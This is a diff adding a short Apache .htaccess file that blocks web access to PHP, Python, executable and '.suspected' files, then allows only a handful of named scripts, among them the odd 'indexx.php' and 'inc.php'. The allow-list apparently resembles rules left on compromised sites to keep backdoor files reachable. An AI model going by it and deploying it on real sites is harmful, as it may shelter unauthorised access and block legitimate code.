@@ -1,0 +1,8 @@
+<FilesMatch ".*\.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|wp-login.php|admin.php|inc.php|indexx.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
